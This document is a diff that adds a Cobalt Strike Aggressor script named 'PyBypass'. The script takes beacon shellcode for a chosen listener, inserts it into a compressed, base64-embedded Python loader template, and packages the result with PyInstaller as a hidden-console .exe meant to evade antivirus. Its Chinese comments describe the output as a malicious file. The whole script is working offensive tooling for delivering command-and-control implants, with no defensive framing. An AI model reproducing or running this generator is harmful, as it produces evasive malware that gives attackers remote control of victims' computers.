@@ -1,0 +1,88 @@
+popup attacks{
+	item("&PyBypass_bate04",{Generator();});
+}
+
+bind Ctrl+G{
+	Generator();
+}
+
+sub Generator{
+	$dialog = dialog("Generator", %(listener => "" , bit => false), &build);
+	drow_listener($dialog, "listener", "Listener: ");
+	dialog_description($dialog, "Bypass by Pthon");
+	dbutton_action($dialog, "Generate");
+	drow_checkbox($dialog, "bit", "x64: ", "64   payload");
+	dialog_show($dialog);
+}
+
+sub build{
+    
+	$a = $3["bit"] . "";
+
+	if ($3["bit"] eq "false"){
+		$system = "x86";
+		$arch = "386";
+	}else{
+		$system = "x64";
+		$arch = "amd64";
+	}
+
+	$code = gunzip(base64_decode("H4sIAEih5WIA/+1W63PTRhD/rr/iakx1wkbjJK5LM03bFEpfpKFAoTQFz1la25fIkjidsdXp9G9n91Yvgs2k/VyPxzrt/vb1uF3PTbYSM1XAZCz0Ks+MFbPJGNIoi0GoQih68Rwq1kUNIe5Up/PMqwhGpXG2GhbW6HTheY4/X6eROBG9Xo/lP7ASQ8dKDIyKbJlDawit2GE0XeNjMh5udBonCb5HS2WGeYZUMJ4Xwxy1xHP5ZgMmOPZE9YEtRExjzDYz08iUuZWxsmoorqCs0HhCV/E35NBl4MiRzpdgpoRG9sUrR0wgrSl4dKoYTQxWRHRS7sjzzAgdb4VOKU0LkLWCjqczjVlwDlwQ9Hatiy06V9bGTGelBYSRMOE63NbRUOU5pLF0Kl+3cuyMAbs2qSCCMkaVsiMZeFQrLp5Zp1XtOCK/j8++783Wc3zrF0tIEgL2vSRTMRgi8qnvVSBXVNnmnN+RFwwpN4FHlUHcdQSrYVDIPYLlaOvLXjZmfd93xc3LI6Ydysa7ToYbGoq00bfIBsg9Fl6BSSE5Ogyfa2PXKjlNkiwKDRTUn6ij7slGLrfkzcekZYNtykbtLUfBcA+H+qh1cS9stD0ajfZrGW3Hoza+9sRlknybxB3XtR1rId3HKYLmYG6SqCc2OcvewhmsMlPuipUTJjFRO1xFOzfMwo5Iljh+EqrKdZ/uG1AWni3xEf/79O/mfDSM/6KymmNYCEbsivB6YC+Utg8z8xTHbQLns0uI7L74ODl7Pbp70LXXuUV0Uz26XZ7l24xlYF4zJAN38xZgaVbJ9OTe6L156tulLqb4LX0ekBne3wjXAPHULELhxVJfXiWrNMvfmMKu32625V8MXuMYa8Cn395/8N3D73/48aefH539cv741ydPn/32/MXvL/9gcKwX2tIE9UcHh0fjzyaf3/uCOUW5mmXE+OSbW/3brz+9I4Pp4O/jL7/6+p8KABDTyK59GzSGB6x14FR0w/LDSyyZ5KUXFmqVJyBJz8XoOH01FAd1Datpi2L/L6AbLaBq29QdhYT35rbff3z68tH56QPcRF0GN2eb3YZXbRpu2+ke9LWmrmR4EdKkr//MDOrN2OXgSsgTFYHsuQ3Zo/9ALvXBny7eDr9dmozqzLQPsNUuZWDHfXIsVSuyXifpcBKIgeiFedmrWe5xS1AfL72NtkuRYUnkXCdwQrzhClWd+Bs/wBLl3AV5uDHaguQh7+X4T85KAgfvAI2m8OUkCgAA"));
+	$shell_code = shellcode($3["listener"], false, $system);
+	
+	# 以时间做文件名
+    $time = ticks() - (1000 * 60 * 60 8 23);
+    $arg = formatDate($time, "yyyy_MM_dd_HH_mm_ss");
+    $arg = $arg . ".exe";
+   
+    prompt_file_save($arg, {
+        println("\n-------------\n  start\n-------------\n");
+
+        # 获取用户选择的路径，
+        $name = "$1";
+		$name = replace($name, "\\\\", "\\\\\\\\");
+        $codefile = "C:\\\\windows\\\\temp\\\\code.py";
+        $tempfile = "C:\\\\windows\\\\temp\\\\temp.py";
+		
+		# 再删一编旧文件
+        deleteFile($codefile);
+        deleteFile($tempfile);
+
+        # 替换shellcode与生成路径并写入
+        $code = replace($code, '\$PAYLOAD\$', base64_encode($shell_code));
+        $code = replace($code, 'name \# perch', 'r"' . $tempfile . '"');
+     
+        # 写入code.py
+        $handle = openf("> $+ $codefile");
+        writeb($handle, $code);
+        closef($handle);
+        println("writeb file");
+        # $KEY = rand(255);
+        
+		# 生成恶意文件，删除旧编译文件，重新编译新文件
+           exec("python  $+ $codefile");
+        # println("python  $+ $codefile");
+        
+           exec("rd /s /q  dist");
+        # println("rd /s /q  dist");
+
+           exec("rd /s /q  build");
+        # println("rd /s /q  build");
+        
+           exec("powershell pyinstaller5 --distpath   $+   $name  $+   --noconsole --key 1235123 --onefile  $+  $tempfile  $+    >  pyinstaller.log.this_is_y 2\>\&1");
+        # println("powershell pyinstaller5 --distpath   $+   $name  $+   --noconsole --onefile  $+  $tempfile  $+    >  pyinstaller.log.this_is_y 2\>\&1");
+    
+        $name = $name . "\\\\" . getFileName($name);
+        # println($name);
+        if (-exists $name)
+        {   
+            println("file exits");
+            deleteFile($codefile);
+            deleteFile($tempfile);
+        }
+			
+		show_message("python运行速度有点慢，save to  $+ $name ");
+        # println("\n-------------\n   over\n-------------\n");
+    });
+
+}
